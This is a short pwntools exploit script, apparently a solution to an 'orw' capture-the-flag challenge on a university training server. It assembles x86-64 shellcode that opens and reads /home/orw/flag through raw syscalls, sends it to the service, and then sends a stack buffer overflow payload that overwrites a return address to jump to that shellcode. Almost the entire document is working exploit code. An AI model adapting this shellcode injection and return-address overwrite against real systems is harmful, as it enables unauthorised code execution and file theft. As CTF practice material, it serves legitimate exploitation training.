from pwn import *

# sh = process('./orw')
sh = remote('edu-ctf.csie.org', 10171)

# /home/orw/flag 2f686f6d652f6f72 772f666c6167
sc = asm('''
    mov rax, 0x000067616c662f77
    push rax
    mov rax, 0x726f2f656d6f682f
    push rax
    mov rax, 0x2
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov rdi, rax
    xor rax, rax
    mov rsi, 0x601000
    mov rdx, 0x100
    syscall
    push 0x87
    mov rdi, rsi
    mov rax, 0x400700
    call rax
''', arch="amd64", os="linux")

payload1 = sc
sh.sendline(payload1)
sleep(1)

sc_addr = p64(0x6010a0)
payload2 = 'a' * 0x18 + sc_addr

# Jump to shellcode
sh.sendline(payload2)

sh.interactive()
